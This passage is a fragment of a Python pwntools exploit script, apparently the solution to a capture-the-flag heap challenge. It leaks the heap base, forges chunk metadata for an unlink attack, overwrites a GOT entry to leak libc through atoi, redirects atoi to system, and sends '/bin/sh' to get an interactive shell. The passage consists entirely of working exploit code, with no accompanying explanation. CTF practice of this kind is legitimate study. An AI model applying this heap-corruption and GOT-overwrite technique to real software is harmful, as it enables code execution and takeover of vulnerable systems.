   delete(3)
   delete(1)
   padding = 'f**k' * ((0x80 + 0x10)/4)
   edit(0, padding)
   list()
   r.recvuntil(padding)
   chunk3 = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00'))
   heap_base = chunk3 - 6176 - 0x90 * 3
   chunk0 = heap_base + 0x30
   print(heap_base)
   print(chunk0)
   #unlink
   payload = p64(0x90) + p64(0x80) + p64(chunk0 - 0x18) + p64(chunk0 - 0x10)
   payload += 'f**k' * ((0x80 - 4 * 8)/4)
   payload += p64(0x80) + p64(0x90) + 'f**k' * (0x70/4)
   edit(0, payload)
   delete(1)
   gdb.attach(r)
   #leak libc
   payload = p64(2) + p64(1) + p64(0x100) + p64(chunk0 - 0x18)
   payload += p64(1) + p64(0x8) + p64(elf.got["atoi"])
   payload = payload.ljust(0x100, '\x00')
   edit(0, payload)
   list()
   #gdb.attach(r)
   r.recvuntil("0. ")
   r.recvuntil("1. ")
   libc.address = u64(r.recvuntil("\x0a", drop = True).ljust(8, '\x00')) - libc.sym["atoi"]
   #get shell
   edit(1, p64(libc.sym['system']))
   r.sendlineafter("choice: ", "/bin/sh")
   r.interactive()
   
   ```

   

